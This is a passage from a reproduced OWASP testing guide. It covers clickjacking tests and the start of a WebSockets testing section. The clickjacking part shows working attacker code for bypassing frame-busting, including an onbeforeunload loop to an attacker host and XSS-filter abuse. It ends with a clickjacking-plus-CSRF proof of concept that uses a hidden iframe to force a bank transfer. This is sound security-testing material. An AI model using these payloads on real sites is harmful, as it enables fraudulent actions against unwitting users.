                <p>Attacker’s top frame (<code class="language-plaintext highlighter-rouge">fictitious2.html</code>):</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"fictitious.html"</span><span class="nt">&gt;</span>
                </code></pre></div></div>
                
                <p>Attacker’s fictitious sub-frame (<code class="language-plaintext highlighter-rouge">fictitious.html</code>):</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://example.org"</span><span class="nt">&gt;</span>
                </code></pre></div></div>
                
                <h5 id="disabling-javascript">Disabling JavaScript</h5>
                
                <p>Since these type of client-side protections relies on JavaScript frame busting code, if the victim has JavaScript disabled or it is possible for an attacker to disable JavaScript code, the web page will not have any protection mechanism against clickjacking.</p>
                
                <p>There are three deactivation techniques that can be used with frames:</p>
                
                <ul>
                  <li>Restricted frames with Internet Explorer: Starting from Internet Explorer 6, a frame can have the “security” attribute that, if it is set to the value “restricted”, ensures that JavaScript code, ActiveX controls, and re-directs to other sites do not work in the frame.</li>
                </ul>
                
                <p>Example:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://example.org"</span> <span class="na">security=</span><span class="s">"restricted"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
                </code></pre></div></div>
                
                <ul>
                  <li>Sandbox attribute: with HTML5 there is a new attribute called “sandbox”. It enables a set of restrictions on content loaded into the iframe. At this moment this attribute is only compatible with Chrome and Safari.</li>
                </ul>
                
                <p>Example:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://example.org"</span> <span class="na">sandbox</span><span class="nt">&gt;&lt;/iframe&gt;</span>
                </code></pre></div></div>
                
                <ul>
                  <li>Design mode: Paul Stone showed a security issue concerning the “designMode” that can be turned on in the framing page (via document.designMode), disabling JavaScript in top and sub-frame. The design mode is currently implemented in Firefox and IE8.</li>
                </ul>
                
                <h5 id="onbeforeunload-event">OnBeforeUnload Event</h5>
                
                <p>The <code class="language-plaintext highlighter-rouge">onBeforeUnload</code> event could be used to evade frame busting code. This event is called when the frame busting code wants to destroy the iframe by loading the URL in the whole web page and not only in the iframe. The handler function returns a string that is prompted to the user asking confirm if he wants to leave the page. When this string is displayed to the user is likely to cancel the navigation, defeating target’s frame busting attempt.</p>
                
                <p>The attacker can use this attack by registering an unload event on the top page using the following example code:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>www.fictitious.site<span class="nt">&lt;/h1&gt;</span>
                <span class="nt">&lt;script&gt;</span>
                    <span class="nb">window</span><span class="p">.</span><span class="nx">onbeforeunload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span>
                    <span class="p">{</span>
                        <span class="k">return</span> <span class="dl">"</span><span class="s2"> Do you want to leave fictitious.site?</span><span class="dl">"</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="nt">&lt;/script&gt;</span>
                <span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://example.org"</span><span class="nt">&gt;</span>
                </code></pre></div></div>
                
                <p>The previous technique requires the user interaction but, the same result, can be achieved without prompting the user. To do this the attacker have to automatically cancel the incoming navigation request in an onBeforeUnload event handler by repeatedly submitting (for example every millisecond) a navigation request to a web page that responds with a “HTTP/1.1 204 No Content” header.</p>
                
                <p>Since with this response the browser will do nothing, the resulting of this operation is the flushing of the request pipeline, rendering the original frame busting attempt futile.</p>
                
                <p>Following an example code:</p>
                
                <p>204 page:</p>
                
                <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
                    <span class="nb">header</span><span class="p">(</span><span class="s2">"HTTP/1.1 204 No Content"</span><span class="p">);</span>
                <span class="cp">?&gt;</span>
                </code></pre></div></div>
                
                <p>Attacker’s page:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
                    <span class="kd">var</span> <span class="nx">prevent_bust</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                    <span class="nb">window</span><span class="p">.</span><span class="nx">onbeforeunload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                        <span class="nx">prevent_bust</span><span class="o">++</span><span class="p">;</span>
                    <span class="p">};</span>
                    <span class="nx">setInterval</span><span class="p">(</span>
                        <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                            <span class="k">if</span> <span class="p">(</span><span class="nx">prevent_bust</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                                <span class="nx">prevent_bust</span> <span class="o">-=</span> <span class="mi">2</span><span class="p">;</span>
                                <span class="nb">window</span><span class="p">.</span><span class="nx">top</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://attacker.site/204.php</span><span class="dl">"</span><span class="p">;</span>
                            <span class="p">}</span>
                        <span class="p">},</span> <span class="mi">1</span><span class="p">);</span>
                <span class="nt">&lt;/script&gt;</span>
                <span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://example.org"</span><span class="nt">&gt;</span>
                </code></pre></div></div>
                
                <h5 id="xss-filter">XSS Filter</h5>
                
                <p>Starting from Google Chrome 4.0 and from IE8 there were introduced XSS filters to protect users from reflected XSS attacks. Nava and Lindsay have observed that these kind of filters can be used to deactivate frame busting code by faking it as malicious code.</p>
                
                <ul>
                  <li><strong>IE8 XSS filter</strong>: this filter has visibility into all parameters of each request and response flowing through the web browser and it compares them to a set of regular expressions in order to look for reflected XSS attempts. When the filter identifies a possible XSS attacks; it disables all inline scripts within the page, including frame busting scripts (the same thing could be done with external scripts). For this reason an attacker could induce a false positive by inserting the beginning of the frame busting script into a request’s parameters.</li>
                </ul>
                
                <p>Example: Target web page frame busting code:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
                    <span class="k">if</span> <span class="p">(</span> <span class="nx">top</span> <span class="o">!=</span> <span class="nb">self</span> <span class="p">)</span>
                    <span class="p">{</span>
                        <span class="nx">top</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="nb">self</span><span class="p">.</span><span class="nx">location</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="nt">&lt;/script&gt;</span>
                </code></pre></div></div>
                
                <p>Attacker code:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://example.org/?param=&lt;script&gt;if"</span><span class="nt">&gt;</span>
                </code></pre></div></div>
                
                <ul>
                  <li><strong>Chrome 4.0 XSSAuditor filter</strong>: It has a little different behaviour compared to IE8 XSS filter, in fact with this filter an attacker could deactivate a “script” by passing its code in a request parameter. This enables the framing page to specifically target a single snippet containing the frame busting code, leaving all the other codes intact.</li>
                </ul>
                
                <p>Example: Target web page frame busting code:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
                    <span class="k">if</span> <span class="p">(</span> <span class="nx">top</span> <span class="o">!=</span> <span class="nb">self</span> <span class="p">)</span>
                    <span class="p">{</span>
                        <span class="nx">top</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="nb">self</span><span class="p">.</span><span class="nx">location</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="nt">&lt;/script&gt;</span>
                </code></pre></div></div>
                
                <p>Attacker code:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://example.org/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D"</span><span class="nt">&gt;</span>
                </code></pre></div></div>
                
                <h5 id="redefining-location">Redefining Location</h5>
                
                <p>For several browser the “document.location” variable is an immutable attribute. However, for some version of Internet Explorer and Safari, it is possible to redefine this attribute. This fact can be exploited to evade frame busting code.</p>
                
                <ul>
                  <li><strong>Redefining location in IE7 and IE8</strong>: it is possible to redefine “location” as it is illustrated in the following example. By defining “location” as a variable, any code that tries to read or to navigate by assigning “top.location” will fail due to a security violation and so the frame busting code is suspended.</li>
                </ul>
                
                <p>Example:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
                    <span class="kd">var</span> <span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">xyz</span><span class="dl">"</span><span class="p">;</span>
                <span class="nt">&lt;/script&gt;</span>
                <span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://example.org"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
                </code></pre></div></div>
                
                <ul>
                  <li><strong>Redefining location in Safari 4.0.4</strong>: To bust frame busting code with “top.location” it is possible to bind “location” to a function via defineSetter (through window), so that an attempt to read or navigate to the “top.location” will fail.</li>
                </ul>
                
                <p>Example:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
                    <span class="nb">window</span><span class="p">.</span><span class="nx">defineSetter</span><span class="p">(</span><span class="dl">"</span><span class="s2">location</span><span class="dl">"</span> <span class="p">,</span> <span class="kd">function</span><span class="p">(){});</span>
                <span class="nt">&lt;/script&gt;</span>
                <span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://example.org"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
                </code></pre></div></div>
                
                <h4 id="server-side-protection-x-frame-options">Server-side Protection: X-Frame-Options</h4>
                
                <p>An alternative approach to client-side frame busting code was implemented by Microsoft and it consists of an header based defense. This new “X-FRAME-OPTIONS” header is sent from the server on HTTP responses and is used to mark web pages that shouldn’t be framed. This header can take the values DENY, SAMEORIGIN, ALLOW-FROM origin, or non-standard ALLOWALL. Recommended value is DENY.</p>
                
                <p>The “X-FRAME-OPTIONS” is a very good solution, and was adopted by major browser, but also for this technique there are some limitations that could lead in any case to exploit the clickjacking vulnerability.</p>
                
                <h5 id="browser-compatibility">Browser Compatibility</h5>
                
                <p>Since the “X-FRAME-OPTIONS” was introduced in 2009, this header is not compatible with old browser. So every user that doesn’t have an updated browser could be victim of clickjacking attack.</p>
                
                <table>
                  <thead>
                    <tr>
                      <th>Browser</th>
                      <th>Lowest version</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td>Internet Explorer</td>
                      <td>8.0</td>
                    </tr>
                    <tr>
                      <td>Firefox (Gecko)</td>
                      <td>3.6.9 (1.9.2.9)</td>
                    </tr>
                    <tr>
                      <td>Opera</td>
                      <td>10.50</td>
                    </tr>
                    <tr>
                      <td>Safari</td>
                      <td>4.0</td>
                    </tr>
                    <tr>
                      <td>Chrome</td>
                      <td>4.1.249.1042</td>
                    </tr>
                  </tbody>
                </table>
                
                <h5 id="proxies">Proxies</h5>
                
                <p>Web proxies are known for adding and stripping headers. In the case in which a web proxy strips the “X-FRAME-OPTIONS” header then the site loses its framing protection.</p>
                
                <h5 id="mobile-website-version-1">Mobile Website Version</h5>
                
                <p>Also in this case, since the <code class="language-plaintext highlighter-rouge">X-FRAME-OPTIONS</code> has to be implemented in every page of the website, the developers may have not protected the mobile version of the website.</p>
                
                <h3 id="create-a-proof-of-concept">Create a Proof of Concept</h3>
                
                <p>Once we have discovered that the site we are testing is vulnerable to clickjacking attack, we can proceed with the development of a <code class="language-plaintext highlighter-rouge">proof of concept</code> (PoC) to demonstrate the vulnerability. It is important to note that, as mentioned previously, these attacks can be used in conjunction with other forms of attacks (for example CSRF attacks) and could lead to overcome anti-CSRF tokens. In this regard we can imagine that, for example, the <code class="language-plaintext highlighter-rouge">example.org</code> website allows to authenticated and authorized users to make a transfer of money to another account.</p>
                
                <p>Suppose that to execute the transfer the developers have planned three steps. In the first step the user fill a form with the destination account and the amount. In the second step, whenever the user submits the form, is presented a summary page asking the user confirmation (like the one presented in the following picture).</p>
                
                
                <p>Following a snippet of the code for the step 2:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//generate random anti CSRF token
                $csrfToken = md5(uniqid(rand(), TRUE));
                
                //set the token as in the session data
                $_SESSION['antiCsrf'] = $csrfToken;
                
                //Transfer form with the hidden field
                $form = '
                <span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">"transferForm"</span> <span class="na">action=</span><span class="s">"confirm.php"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"box"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;h1&gt;</span>BANK XYZ - Confirm Transfer<span class="nt">&lt;/h1&gt;</span>
                        <span class="nt">&lt;p&gt;</span>
                        Do You want to confirm a transfer of <span class="nt">&lt;b&gt;</span>'. $_REQUEST['amount'] .' <span class="ni">&amp;euro;</span><span class="nt">&lt;/b&gt;</span> to account: <span class="nt">&lt;b&gt;</span>'. $_REQUEST['account'] .'<span class="nt">&lt;/b&gt;</span> ?
                        <span class="nt">&lt;/p&gt;</span>
                        <span class="nt">&lt;label&gt;</span>
                            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"amount"</span> <span class="na">value=</span><span class="s">"' . $_REQUEST['amount'] . '"</span> <span class="nt">/&gt;</span>
                            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"account"</span> <span class="na">value=</span><span class="s">"' . $_REQUEST['account'] . '"</span> <span class="nt">/&gt;</span>
                            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"antiCsrf"</span> <span class="na">value=</span><span class="s">"' . $csrfToken . '"</span> <span class="nt">/&gt;</span>
                            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"button"</span> <span class="na">value=</span><span class="s">"Transfer Money"</span> <span class="nt">/&gt;</span>
                        <span class="nt">&lt;/label&gt;</span>
                
                        <span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/form&gt;</span>';
                </code></pre></div></div>
                
                <p>In the last step are planned security controls and then, if all is ok, the transfer is done. In the following listing a snippet of code of the last step is presented:</p>
                
                <blockquote>
                  <p>Note: in this example, for simplicity, there is no input sanitization, but it has no relevance to block this type of attack</p>
                </blockquote>
                
                <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="o">!</span><span class="nx">empty</span><span class="p">(</span><span class="nx">$_SESSION</span><span class="p">[</span><span class="dl">'</span><span class="s1">antiCsrf</span><span class="dl">'</span><span class="p">]))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">!</span><span class="nx">empty</span><span class="p">(</span><span class="nx">$_POST</span><span class="p">[</span><span class="dl">'</span><span class="s1">antiCsrf</span><span class="dl">'</span><span class="p">]))</span> <span class="p">)</span>
                <span class="p">{</span>
                    <span class="c1">// input logic and sanization checks</span>
                
                    <span class="c1">// check the anti-CSRF token</span>
                    <span class="k">if</span><span class="p">((</span><span class="nx">$_SESSION</span><span class="p">[</span><span class="dl">'</span><span class="s1">antiCsrf</span><span class="dl">'</span><span class="p">]</span> <span class="o">==</span> <span class="nx">$_POST</span><span class="p">[</span><span class="dl">'</span><span class="s1">antiCsrf</span><span class="dl">'</span><span class="p">])</span> <span class="p">{</span>
                        <span class="nx">echo</span> <span class="dl">'</span><span class="s1">&lt;p&gt; </span><span class="dl">'</span><span class="p">.</span> <span class="nx">$_POST</span><span class="p">[</span><span class="dl">'</span><span class="s1">amount</span><span class="dl">'</span><span class="p">]</span> <span class="p">.</span><span class="dl">'</span><span class="s1"> &amp;euro; successfully transferred to account: </span><span class="dl">'</span><span class="p">.</span> <span class="nx">$_POST</span><span class="p">[</span><span class="dl">'</span><span class="s1">account</span><span class="dl">'</span><span class="p">]</span> <span class="p">.</span><span class="dl">'</span><span class="s1"> &lt;/p&gt;</span><span class="dl">'</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="nx">echo</span> <span class="dl">'</span><span class="s1">&lt;p&gt;Transfer KO&lt;/p&gt;</span><span class="dl">'</span><span class="p">;</span>
                <span class="p">}</span>
                </code></pre></div></div>
                
                <p>As you can see the code is protected from CSRF attack both with a random token generated in the second step and accepting only variable passed via POST method. In this situation an attacker could forge a CSRF + Clickjacking attack to evade anti-CSRF protection and force a victim to do a money transfer without her consent.</p>
                
                <p>The target page for the attack is the second step of the money transfer procedure. Since the developers put the security controls only in the last step, thinking that this is secure enough, the attacker could pass the account and amount parameters via GET method.</p>
                
                <blockquote>
                  <p>Note: there is an advanced clickjacking attack that permits to force users to fill a form, so also in the case in which is required to fill a form, the attack is feasible</p>
                </blockquote>
                
                <p>The attacker’s page may look like a simple and harmless web page like the one presented below:</p>

                
                <p>But playing with the CSS opacity value we can see what is hidden under the seemingly innocuous web page.</p>

                
                <p>The clickjacking code to create this page is presented below:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
                    <span class="nt">&lt;head&gt;</span>
                        <span class="nt">&lt;title&gt;</span>Trusted web page<span class="nt">&lt;/title&gt;</span>
                
                        <span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span><span class="o">&lt;!</span><span class="nt">--</span>
                            <span class="o">*</span><span class="p">{</span>
                                <span class="nl">margin</span><span class="p">:</span><span class="m">0</span><span class="p">;</span>
                                <span class="nl">padding</span><span class="p">:</span><span class="m">0</span><span class="p">;</span>
                            <span class="p">}</span>
                            <span class="nt">body</span> <span class="p">{</span>  
                                <span class="nl">background</span><span class="p">:</span><span class="m">#ffffff</span><span class="p">;</span>
                            <span class="p">}</span>
                            <span class="nc">.button</span>
                            <span class="p">{</span>
                                <span class="nl">padding</span><span class="p">:</span><span class="m">5px</span><span class="p">;</span>
                                <span class="nl">background</span><span class="p">:</span><span class="m">#6699CC</span><span class="p">;</span>
                                <span class="nl">left</span><span class="p">:</span><span class="m">275px</span><span class="p">;</span>
                                <span class="nl">width</span><span class="p">:</span><span class="m">120px</span><span class="p">;</span>
                                <span class="nl">border</span><span class="p">:</span> <span class="m">1px</span> <span class="nb">solid</span> <span class="m">#336699</span><span class="p">;</span>
                            <span class="p">}</span>
                            <span class="nf">#content</span> <span class="p">{</span>
                                <span class="nl">width</span><span class="p">:</span> <span class="m">500px</span><span class="p">;</span>
                                <span class="nl">height</span><span class="p">:</span> <span class="m">500px</span><span class="p">;</span>
                                <span class="nl">margin-top</span><span class="p">:</span> <span class="m">150px</span> <span class="p">;</span>
                                <span class="nl">margin-left</span><span class="p">:</span> <span class="m">500px</span><span class="p">;</span>
                            <span class="p">}</span>
                            <span class="nf">#clickjacking</span>
                            <span class="p">{</span>
                                <span class="nl">position</span><span class="p">:</span> <span class="nb">absolute</span><span class="p">;</span>
                                <span class="nl">left</span><span class="p">:</span> <span class="m">172px</span><span class="p">;</span>
                                <span class="nl">top</span><span class="p">:</span> <span class="m">60px</span><span class="p">;</span>
                                <span class="nl">filter</span><span class="p">:</span> <span class="n">alpha</span><span class="p">(</span><span class="n">opacity</span><span class="err">=</span><span class="m">0</span><span class="p">);</span>
                                <span class="nl">opacity</span><span class="p">:</span><span class="m">0.0</span>
                            <span class="p">}</span>
                        <span class="o">//</span><span class="nt">--</span><span class="o">&gt;</span><span class="nt">&lt;/style&gt;</span>
                
                    <span class="nt">&lt;/head&gt;</span>
                    <span class="nt">&lt;body&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"content"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;h1&gt;</span>www.owasp.com<span class="nt">&lt;/h1&gt;</span>
                            <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://www.owasp.com"</span><span class="nt">&gt;</span>
                                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"button"</span> <span class="na">value=</span><span class="s">"Click and go!"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;/form&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                
                                <span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"clickjacking"</span> <span class="na">src=</span><span class="s">"http://localhost/csrf/transfer.php?account=ATTACKER&amp;amount=10000"</span> <span class="na">width=</span><span class="s">"500"</span> <span class="na">height=</span><span class="s">"500"</span> <span class="na">scrolling=</span><span class="s">"no"</span> <span class="na">frameborder=</span><span class="s">"none"</span><span class="nt">&gt;</span>
                                <span class="nt">&lt;/iframe&gt;</span>
                    <span class="nt">&lt;/body&gt;</span>
                <span class="nt">&lt;/html&gt;</span>
                </code></pre></div></div>
                
                <p>With the help of CSS (note the <code class="language-plaintext highlighter-rouge">#clickjacking</code> block) we can mask and suitably position the iframe in such a way as to match the buttons. If the victim click on the button “Click and go!” the form is submitted and the transfer is completed.</p>
                
                
                <p>The example presented uses only basic clickjacking technique, but with advanced technique is possible to force user filling form with values defined by the attacker.</p>
                
                <h2 id="references">References</h2>
                
                <ul>
                  <li><a href="https://owasp.org/www-community/attacks/Clickjacking">OWASP Clickjacking</a></li>
                  <li><a href="https://en.wikipedia.org/wiki/Clickjacking">Wikipedia Clickjacking</a></li>
                  <li><a href="https://www.contextis.com/media/downloads/Context-Clickjacking_white_paper_2010.pdf">Context Information Security: “Next Generation Clickjacking”</a></li>
                  <li><a href="https://seclab.stanford.edu/websec/framebusting/framebust.pdf">Gustav Rydstedt, Elie Bursztein, Dan Boneh, and Collin Jackson: “Busting Frame Busting: a Study of Clickjacking Vulnerabilities on Popular Sites”</a></li>
                  <li><a href="https://media.blackhat.com/bh-eu-10/presentations/Stone/BlackHat-EU-2010-Stone-Next-Generation-Clickjacking-slides.pdf">Paul Stone: “Next generation clickjacking”</a></li>
                </ul>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="clnt10Modal" tabindex="-1" role="dialog" aria-labelledby="clnt10ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="clnt10ModalLabel">WSTG-CLNT-10 - Testing WebSockets</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>Traditionally, the HTTP protocol only allows one request/response per TCP connection. Asynchronous JavaScript and XML (AJAX) allows clients to send and receive data asynchronously (in the background without a page refresh) to the server, however, AJAX requires the client to initiate the requests and wait for the server responses (half-duplex).</p>
                
                <p><a href="https://html.spec.whatwg.org/multipage/web-sockets.html#network">WebSockets</a> allow the client or server to create a ‘full-duplex’ (two-way) communication channel, allowing the client and server to truly communicate asynchronously. WebSockets conduct their initial <em>upgrade</em> handshake over HTTP and from then on all communication is carried out over TCP channels by use of frames. For more, see the <a href="https://tools.ietf.org/html/rfc6455">WebSocket Protocol</a>.</p>
                
                <h3 id="origin">Origin</h3>
                
                <p>It is the server’s responsibility to verify the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin"><code class="language-plaintext highlighter-rouge">Origin</code> header</a> in the initial HTTP WebSocket handshake. If the server does not validate the origin header in the initial WebSocket handshake, the WebSocket server may accept connections from any origin. This could allow attackers to communicate with the WebSocket server cross-domain allowing for CSRF-like issues. See also <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10-2017 A5-Broken Access Control</a>.</p>
                
                <h3 id="confidentiality-and-integrity">Confidentiality and Integrity</h3>
                
                <p>WebSockets can be used over unencrypted TCP or over encrypted TLS. To use unencrypted WebSockets the <code class="language-plaintext highlighter-rouge">ws://</code> URI scheme is used (default port 80), to use encrypted (TLS) WebSockets the <code class="language-plaintext highlighter-rouge">wss://</code> URI scheme is used (default port 443). See also <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10-2017 A3-Sensitive Data Exposure</a>.</p>
                
                <h3 id="input-sanitization">Input Sanitization</h3>
                
                <p>As with any data originating from untrusted sources, the data should be properly sanitized and encoded. See also <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10-2017 A1-Injection</a> and <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10-2017 A7-Cross-Site Scripting (XSS)</a>.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify the usage of WebSockets.</li>
                  <li>Assess its implementation by using the same tests on normal HTTP channels.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <h3 id="black-box-testing">Black-Box Testing</h3>
                
                <ol>
                  <li>Identify that the application is using WebSockets.
                    <ul>
                      <li>Inspect the client-side source code for the <code class="language-plaintext highlighter-rouge">ws://</code> or <code class="language-plaintext highlighter-rouge">wss://</code> URI scheme.</li>
                      <li>Use Google Chrome’s Developer Tools to view the Network WebSocket communication.</li>
                      <li>Use <a href="https://www.zaproxy.org">ZAP’s</a> WebSocket tab.</li>
                    </ul>
                  </li>
                  <li>Origin.
                    <ul>
                      <li>Using a WebSocket client (one can be found in the <a href="#Tools">Tools</a> section below) attempt to connect to the remote WebSocket server. If a connection is established the server may not be checking the origin header of the WebSocket handshake.</li>
                    </ul>
                  </li>
                  <li>Confidentiality and Integrity.
                    <ul>
                      <li>Check that the WebSocket connection is using SSL to transport sensitive information <code class="language-plaintext highlighter-rouge">wss://</code>.</li>
                      <li>Check the SSL Implementation for security issues (Valid Certificate, BEAST, CRIME, RC4, etc). Refer to the <a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security">Testing for Weak Transport Layer Security</a> section of this guide.</li>
                    </ul>
                  </li>
                  <li>Authentication.
                    <ul>
                      <li>WebSockets do not handle authentication, normal black-box authentication tests should be carried out. Refer to the <a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/README">Authentication Testing</a> sections of this guide.</li>
                    </ul>
                  </li>
                  <li>Authorization.
                    <ul>
                      <li>WebSockets do not handle authorization, normal black-box authorization tests should be carried out. Refer to the <a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/05-Authorization_Testing/README">Authorization Testing</a> sections of this guide.</li>
                    </ul>
                  </li>
                  <li>Input Sanitization.
                    <ul>
                      <li>Use <a href="https://www.zaproxy.org">ZAP’s</a> WebSocket tab to replay and fuzz WebSocket request and responses. Refer to the <a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README">Testing for Data Validation</a> sections of this guide.</li>
                    </ul>
                  </li>
                </ol>
                
                <h4 id="example-1">Example 1</h4>
                
                <p>Once we have identified that the application is using WebSockets (as described above) we can use the <a href="https://www.zaproxy.org">OWASP Zed Attack Proxy (ZAP)</a> to intercept the WebSocket request and responses. ZAP can then be used to replay and fuzz the WebSocket request/responses.</p>
                
                
                <h4 id="example-2">Example 2</h4>
                
                <p>Using a WebSocket client (one can be found in the <a href="#Tools">Tools</a> section below) attempt to connect to the remote WebSocket server. If the connection is allowed the WebSocket server may not be checking the WebSocket handshake’s origin header. Attempt to replay requests previously intercepted to verify that cross-domain WebSocket communication is possible.</p>
                
                
                <h3 id="gray-box-testing">Gray-Box Testing</h3>
                
                <p>Gray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. The only difference here is that you may have API documentation for the application being tested which includes the expected WebSocket request and responses.</p>
                
                <h2 id="tools">Tools</h2>
                
                <ul>
                  <li><a href="https://www.zaproxy.org">OWASP Zed Attack Proxy (ZAP)</a></li>
                  <li><a href="https://github.com/ethicalhack3r/scripts/blob/master/WebSockets.html">WebSocket Client</a></li>
                  <li><a href="https://chrome.google.com/webstore/detail/simple-websocket-client/pfdhoblngboilpfeibdedpjgfnlcodoo?hl=en">Google Chrome Simple WebSocket Client</a></li>
                </ul>
                
                <h2 id="references">References</h2>
                
                <ul>
                  <li><a href="https://www.html5rocks.com/en/tutorials/websockets/basics/">HTML5 Rocks - Introducing WebSockets: Bringing Sockets to the Web</a></li>
                  <li><a href="https://html.spec.whatwg.org/multipage/web-sockets.html#network">W3C - The WebSocket API</a></li>
                  <li><a href="https://tools.ietf.org/html/rfc6455">IETF - The WebSocket Protocol</a></li>
                  <li><a href="http://www.christian-schneider.net/CrossSiteWebSocketHijacking.html">Christian Schneider - Cross-Site WebSocket Hijacking (CSWSH)</a></li>
                  <li><a href="http://juerkkil.iki.fi/files/writings/websocket2012.pdf">Jussi-Pekka Erkkilä - WebSocket Security Analysis (PDF)</a></li>
                  <li><a href="http://www.ub.tuwien.ac.at/dipl/2013/AC07815487.pdf">Robert Koch- On WebSockets in Penetration Testing</a></li>
